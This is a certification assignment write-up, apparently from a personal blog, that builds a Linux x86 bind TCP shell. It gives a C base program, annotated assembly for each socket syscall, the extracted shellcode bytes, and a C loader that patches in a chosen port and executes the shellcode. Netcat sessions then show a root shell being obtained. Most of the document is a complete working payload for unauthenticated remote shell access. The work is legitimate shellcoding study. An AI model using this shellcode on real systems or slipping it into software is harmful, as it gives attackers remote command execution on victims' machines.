---
layout: single
title: 'SLAE32 - Assignment #1 - Bind TCP Shell'
date: 2019-05-13
classes: wide
header:
  teaser: /assets/images/SLAE32/SLAE32.jpg
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
  - Bind TCP Shellcode 
--- 
![](/assets/images/SLAE32/SLAE32.jpg)

## **Student ID : SLAE&nbsp;- 1314**

## **Assignment 1:**

<p style="text-align:justify;">
The goal of this assignment is to create a Shell_Bind_TCP shellcode that does the following
</p>

- **Binds to a port**
- **Executes Shell on incoming connection**

**Also the port number should be easily configurable**

> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert&nbsp;certification


> **The code and scripts for this assignment can be found on** &nbsp;**[github](https://github.com/xvass/SLAE/tree/master/Assignment1)**

> All the development and tests have been implemented in the following architecture

> **Linux kali 5.4.0-kali2-686-pae #1 SMP Debian 5.4.8-1kali1 (2020-01-06) i686 GNU/Linux&nbsp;**

<p style="text-align:justify;">
For this assignment the following C program will be used as a base program in order to create our shellcode
</p>

```c
#include <sys/socket.h> 
#include <sys/types.h>
#include <netinet/in.h>
#include <string.h>
#include <stdio.h>

#define PORT 1234

int main()
{       
        int resfd, sockfd;
        struct sockaddr_in server;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        server.sin_family = AF_INET;
        server.sin_port = htons(PORT); // convert into network byte order
        server.sin_addr.s_addr = INADDR_ANY; // 0.0.0.0
        bind(sockfd, (struct sockaddr *) &server, sizeof(server));              
        listen(sockfd, 0) ;        
        resfd = accept(sockfd, NULL, NULL);           
        dup2(resfd, 2);
        dup2(resfd, 1);
        dup2(resfd, 0);
        execve("/bin/sh", NULL, NULL);
        return 0;
}
```

<p style="text-align:justify;">
In order to convert the above code into x86 assembly, there is a need to investigate the&nbsp; system calls being used. Specifically, the following&nbsp; system calls are used :
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
bind()
listen()
accept()
dup2()
execve()
</pre>

<p style="text-align:justify;">
The above system calls except <b>execve</b> and <b>dup2</b> are socket system calls and they are referenced with <b>socketcall</b> which is a common kernel entry point. Before moving further, the following steps are mentioned in order to construct the bind connection to the client as follows:
</p>

- create a socket
- bind socket to address and port
- listen for connections
- accept connection

<p style="text-align:justify;">
The steps above providing a footprint to further build the bind shellcode. Furthermore, the different numbers assigned to each socket system calls must be searched in order to use them in each step. The following image shows the numbers used for the needed socket system calls
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># cat /usr/include/linux/net.h | grep SYS
#define SYS_SOCKET 1 /* sys_socket(2) */
#define SYS_BIND 2 /* sys_bind(2) */
#define SYS_CONNECT 3 /* sys_connect(2) */
#define SYS_LISTEN 4 /* sys_listen(2) */
#define SYS_ACCEPT 5 /* sys_accept(2) */
#define SYS_GETSOCKNAME 6 /* sys_getsockname(2) */
#define SYS_GETPEERNAME 7 /* sys_getpeername(2) */
#define SYS_SOCKETPAIR 8 /* sys_socketpair(2) */
#define SYS_SEND 9 /* sys_send(2) */
#define SYS_RECV 10 /* sys_recv(2) */
#define SYS_SENDTO 11 /* sys_sendto(2) */
#define SYS_RECVFROM 12 /* sys_recvfrom(2) */
#define SYS_SHUTDOWN 13 /* sys_shutdown(2) */
#define SYS_SETSOCKOPT 14 /* sys_setsockopt(2) */
#define SYS_GETSOCKOPT 15 /* sys_getsockopt(2) */
#define SYS_SENDMSG 16 /* sys_sendmsg(2) */
#define SYS_RECVMSG 17 /* sys_recvmsg(2) */
#define SYS_ACCEPT4 18 /* sys_accept4(2) */
#define SYS_RECVMMSG 19 /* sys_recvmmsg(2) */
#define SYS_SENDMMSG 20 /* sys_sendmmsg(2) */
</pre>


<p style="text-align:justify;">
There are several types of sockets, although stream sockets and datagram sockets are the most commonly used. The types of sockets are also defined for example in Ubuntu 12.04 inside the file /usr/include/i386-linux-gnu/bits/socket.h .The following output shows the assigned values at the stream and datagram sockets accordingly
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># cat /usr/include/i386-linux-gnu/bits/socket.h | grep SOCK_
SOCK_STREAM = 1, /* Sequenced, reliable, connection-based
#define SOCK_STREAM SOCK_STREAM
SOCK_DGRAM = 2, /* Connectionless, unreliable datagrams
#define SOCK_DGRAM SOCK_DGRAM
SOCK_RAW = 3, /* Raw protocol interface. */
#define SOCK_RAW SOCK_RAW
SOCK_RDM = 4, /* Reliably-delivered messages. */
#define SOCK_RDM SOCK_RDM
SOCK_SEQPACKET = 5, /* Sequenced, reliable, connection-based,
#define SOCK_SEQPACKET SOCK_SEQPACKET
SOCK_DCCP = 6, /* Datagram Congestion Control Protocol. */
#define SOCK_DCCP SOCK_DCCP
SOCK_PACKET = 10, /* Linux specific way of getting packets
#define SOCK_PACKET SOCK_PACKET
SOCK_CLOEXEC = 02000000, /* Atomically set close-on-exec flag for the
#define SOCK_CLOEXEC SOCK_CLOEXEC
SOCK_NONBLOCK = 04000 /* Atomically mark descriptor(s) as
#define SOCK_NONBLOCK SOCK_NONBLOCK
</pre>

<p style="text-align:justify;">
Proceeding further, it is time to create the <b>bind.nasm</b> file. Before starting to write the <b>bind</b> shell in assembly, the registers <b>eax</b> , <b>ebx, edi</b> and <b>edx</b> will be zeroed out
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
global _start
section .text
_start:

;zeroing out eax, edi, ebx ,edx registers
xor eax, eax
xor ebx, ebx
xor edx, edx
xor edi, edi
</pre>

### SocketCall Function Synopsis :

```c
#include <linux/net.h>
int socketcall(int call, unsigned long *args);
```

<p style="text-align:justify;">
The <b>call</b> argument determines which <b>socket</b> function to invoke. The <b>args</b> points to a block containing the actual arguments, which are passed through to the appropriate call. In this case, the <b>socketcall</b> system call identifier will be determined first and afterwards the <b>socket</b> system calls ( SYS_SOCKET, SYS_BIND, SYS_LISTEN, SYS_ACCEPT ) will be called through the <b>call</b> instruction in assembly.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall 
#define __NR_socketcall 102
</pre>

<p style="text-align:justify;">
As seen above, the <b>socketcall</b> can be called using the defined identifier <b>102</b> which is <b>0x66</b> in hex. Before moving further in x86 assembly, a very important aspect of the language compilation must be mentioned, which is the calling convention.

In x86 Linux systems the system calls parameters are passed into the stack using the following registers
</p>

- **eax** used to hold the system call number. Also used to hold the return value from the stack
- **ecx, edx, ebx, esi, edi, ebp** are used to pass 6 parameter arguments to system call functions
- All other registers including **EFLAGS** are preserved across the **int 0x80** instruction.

### Socket Function Synopsis :

```c
#include <sys/types.h> 
#include <sys/socket.h> 

int socket(int domain, int type, int protocol);
```

### socket:

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
mov al, 0x66 ; call SocketCall() in order to use the SYS_SOCKET argument
mov bl, 0x1  ; define the SYS_SOCKET value to be 0x1. The value can be stored at bl in order to avoid null values

;;sockfd = socket(AF_INET,SOCK_STREAM,0);

push edx      ; push 0 value to the stack regarding the protocol argument
push ebx      ; SOCK_STREAM constant at type argument 
push byte 0x2 ; AF_INET constant at domain argument
mov ecx, esp  ; point ECX at the top of the stack 
int 0x80      ; call syscall interrupt to execute the arguments 
mov edi, eax  ; EAX will store the return value of the socket
              ; descriptor. the sockfd will be needed to other 
              ; syscalls so it will be saved at EDI register. 
              ; EAX register must be used with other syscalls too
</pre>


<p style="text-align:justify;">
After the socket creation, the next step is to bind the IP address of the target machine as well as a free local port on that machine to the socket descriptor **sockfd**. Also, a port must be chosen that is unlikely to be used by any service at the target machine ( e.g. 1234 ). In order to accomplish the binding , the following system call will be used.
</p>

### Bind Function Synopsis :

```c
#include <sys/types.h> 
#include <sys/socket.h> 


int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

### Bind:

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
mov al, 0x66     ; call SocketCall() in order to use the SYS_BIND argument
inc bl           ; increase the ebx from 0x1 to 0x2 which indicates the bind() syscall 

;;server.sin_family = AF_INET; 
;;server.sin_port = htons(PORT); 
;;server.sin_addr.s_addr = INADDR_ANY; 

push edx         ; INADDR_ANY 0.0.0.0
push word 0xd204 ; port value 1234 in Network Byte order
push bx          ; AF_INET constant 
mov ecx, esp     ; stack alignment. ECX points to struct

;; bind(sockfd, (struct sockaddr *) &server, sizeof(server));
;; using the strace command the following output gives the values used
;; bind(3, {sa_family=AF_INET, sin_port=htons(1234), sin_addr=inet_addr("0.0.0.0")}, 16)

push byte 0x10  ; sizeof(server) 0x10 equals 16 in decimal
push ecx        ; (struct sockaddr *) &server
push edi        ; sockfd 
mov ecx, esp    ; point ECX at the top of the stack 
int 0x80        ; call syscall interrupt to execute the arguments
</pre>


<p style="text-align:justify;">
As seen at the code above, the port number in hex format has been pushed into the stack after it was transformed in network byte order. That happened because ports and addresses are always specified in calls to the socket functions using the network byte order convention. This convention is a method of sorting bytes independently of specific machine architectures. The following python script does the network byte convention and then transforms the decimal value into hex in order to use it when the port pushed on the stack
</p>

```python
#!/usr/bin/python 

import socket, sys 

port = sys.argv[1] 

nport = socket.htons(int(port)) 

print "Port in hex Network Byte order : " , hex(nport)*
```

the following output shows the output of the script above used with the port number **1234**.

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># python nport.py 1234 
Port in hex Network Byte order: 0xd204
</pre>

### Listen Functions Synopsis :

```c
#include <sys/types.h> 
#include <sys/socket.h> 

int listen(int sockfd, int backlog);
```

<p style="text-align:justify;">
After binding the <b>sockfd</b> to the target IP and PORT, a listen method must be initiated in order to start listening for connections.
</p>

### Listen:

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;;listen(sockfd, 0);
push edx      ; push 0 into the stack 
push edi      ; push sockfd descriptor
mov ecx, esp  ; now point to Listen() syscall
add ebx, 0x2  ; add 0x2 to ebx that has the value 0x2. 
              ; 0x4 indicates the listen() syscall 
mov al, 0x66  ; call SocketCall() in order to use the SYS_LISTEN argument
int 0x80      ; call syscall interrupt to execute the arguments
</pre>

### Accept Function Synopsis :&nbsp;

```c
#include <sys/types.h> 
#include <sys/socket.h> 

int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); 

#define _GNU_SOURCE 

#include <sys/socket.h> 

int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
```

<p style="text-align:justify;">
After the <b>listen</b> system call, the <b>accept</b> system call must be called in order to create a new accepted socket and then return the new descriptor referring to that socket. The argument <b>addr</b> is a pointer to **sockaddr** structure. The argument <b>sockfd</b> is the socket descriptor that was created using the <b>socket</b> system call and is bound to a local address using <b>bind</b> system call after it listens for connections using <b>listen</b> system call.
</p>

<p style="text-align:justify;">
The <b>accept4</b> system call is available starting with <b>Linux 2.6.28</b> ; support in glibc is available starting with version <b>2.10</b>
</p>

### Accept:

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;;accept(sockfd, NULL, NULL);
mov al, 0x66     ; call SocketCall() in order to use the SYS_ACCEPT argument
inc bl           ; increase the ebx from 0x4 to 0x5 
                 ; which indicates the Accept() syscall 
push edx         ; push NULL into the stack
push edx         ; push NULL into the stack
push edi         ; push sockfd descriptor 
mov ecx, esp     ; point to Accept()
int 0x80         ; call syscall interrupt to execute the arguments
</pre>

### Dup2 Function Synopsis :

```c
#include <unistd.h> 

int dup2(int oldfd, int newfd);**
```

<p style="text-align:justify;">
After initiating the <b>accept</b> system call, there must be a redirection from standard input, output and error descriptors to the client descriptor returned from <b>accept</b> syscall. This has to be done in order to be able to initiate commands in a shell environment at the target machine. The following description has been taken from Linux manual page: The <b>dup2</b> system call performs the same task as <b>dup</b> , but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in <b>newfd</b>. If the file descriptor <b>newfd</b> was previously open, it is silently closed before being reused.
</p>

### Dup2 :&nbsp; 

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;;dup2(resfd, 2); 
;;dup2(resfd, 1); 
;;dup2(resfd, 0);
mov ebx, eax      ; the first argument in dup2 has the returned socket 
                  ; descriptor from accept syscall. ebx now has the 
                  ; returned socket descriptor (resfd).
xor ecx, ecx      ; zero out the ecx register before use it 
lo: mov al, 0x3f  ; the functional number that indicates dup2 (63 in dec) 
int 0x80          ; call dup2 syscall
inc ecx           ; increase the value of ecx by 1 so 
                  ; it will take all values 
                  ; 0(stdin), 1(stdout), 2(stderr) 
cmp cl, 0x2       ; compare ecx with 2 which indicates 
                  ; the stderr descriptor 
jle lo            ; loop until counter is less or equal to 2
</pre>

### Execve Function Synopsis :


<p style="text-align:justify;">
Now that the standard input, output and error are pointing to 0,1,2 file descriptors, the run the execve function will be run in order to execute the /bin/sh command to the target host.
</p>

```c
#include <unistd.h> 

int execve(const char *filename, char *const&nbsp;argv[], char *const&nbsp;envp[]);
```

### Execve

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;; execve("/bin/sh", NULL, NULL);
xor eax, eax    ; zero out the eax register 
push eax        ; push NULL into the stack 
push 0x68732f2f ; push "hs//" in reverse order into stack 
push 0x6e69622f ; push "nib/" in reverse order into stack 
mov ebx, esp    ; point ebx into stack
push eax        ; push NULL into the stack 
mov edx, esp    ; point to edx into stack 
push ebx        ; push ebx into stack 
mov ecx, esp    ; point to ecx into stack 
mov al, 0xb     ; 0xb indicates the execve syscall 
int 0x80        ; execute execve syscall**
</pre>


<p style="text-align:justify;">
As just shown, the <b>/bin/sh</b> string is pushed onto the stack in reverse order by first pushing the terminating null value of the string, and then pushing the <b>//sh</b> (4 bytes are required for alignment and the second / has no effect), and finally pushing the <b>/bin</b> onto the stack. At this point, we have all that we need on the stack, so <b>esp</b> now points to the location of <b>/bin/sh</b>.
</p>

Then, the following commands will be used in order to compile and link the code.

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
  <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># nasm -f elf32 -o bind.o bind.nasm
  <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># ld -z execstack -o bind bind.o
</pre>

Furthermore, the bind program runs as follows

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># ./bind
</pre>


<p style="text-align:justify;">
Then from <b>netstat</b> tool can be seen that the target machine listens to port <b>1234</b> and waits for an incoming connection.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># netstat -antp | grep 1234 
tcp 0 0 0.0.0.0:1234 0.0.0.0:* LISTEN 1193/./bind
</pre>

Now if we use **netcat** we will be able to connect to the target machine at port **1234** as seen below

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">~ nc -vvv 192.168.200.13 1234
  Connection to 192.168.200.13 port 1234 [tcp/search-agent] succeeded! 
  whoami root 
  netstat -antp | grep 1234 
  tcp 0 0 192.168.200.13:50914 192.168.200.4:1234 ESTABLISHED 812/s
</pre>


Furthermore, the shellcode will be created using the following command

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># objdump -d ./bind|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' "\x31\xc0\x31\xdb\x31\xd2\x31\xf6\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xfe\xc3\x52\x66\x68\x04\xd2\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x52\x56\x89\xe1\x83\xc3\x02\xb0\x66\xcd\x80\xb0\x66\xfe\xc3\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
</pre>

<p style="text-align:justify;">
The following code utilizes the shellcode created from the assembly code above. The program initializes a custom port number to the target host.
</p>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>

#define PORT 29 // 0xd204 --> \x04\xd2

int main(int argc, char* argv[]) {

unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\x31\xd2\x31\xf6\xb0"
"\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1"
"\xcd\x80\x89\xc6\xb0\x66\xfe\xc3\x52"
"\x66\x68\x04\xd2\x66\x53\x89\xe1\x6a"
"\x10\x51\x56\x89\xe1\xcd\x80\x52\x56"
"\x89\xe1\x83\xc3\x02\xb0\x66\xcd\x80"
"\xb0\x66\xfe\xc3\x52\x52\x56\x89\xe1"
"\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd"
"\x80\x41\x80\xf9\x02\x7e\xf6\x31\xc0"
"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89"
"\xe1\xb0\x0b\xcd\x80";

if (argc <= 1) {
        printf("[!] Usage: %s <port>\n\n", argv[0]);
        return -1; 
}
// provide binary form of the port 
unsigned int port = htons(atoi(argv[1]));
// copy the new port in the right shellcode offset 
// 29 bytes from the beginning of the shellcode   
memcpy(&shellcode[PORT], &port, 2);  

printf("[!] Length:  %d\n", strlen(shellcode)); 
int (*ret)() = (int(*)())shellcode;    

ret();
}
```

the following command will be used to compile the program above

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># gcc -fno-stack-protector -z execstack -o bindshell bindshell.c
</pre>

Furthermore, as seen below when the **bindshell** program runs the target machine opens up a communication port or a listener on the target machine and waits for an incoming connection.

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span>#./bindshell 2222 
[!] Length: 104
</pre>


If we run **netstat** we will see that the port **2222** is open and waiting for connections


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># netstat -antp | grep 2222 
tcp 0 0 0.0.0.0:<span style="color:red;">2222</span> 0.0.0.0:* LISTEN 1015/./bindshell
</pre>


Now if we use **netcat** we will be able to connect to the target machine at port **2222** as seen below

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">~ nc -vvv 192.168.200.13 2222
  Connection to 192.168.200.13 port 2222 [tcp/search-agent] succeeded!
  whoami root 
  netstat -antp | grep 2222 
  tcp 0 0 192.168.200.13:50914 192.168.200.4:2222 ESTABLISHED 812/s
</pre>

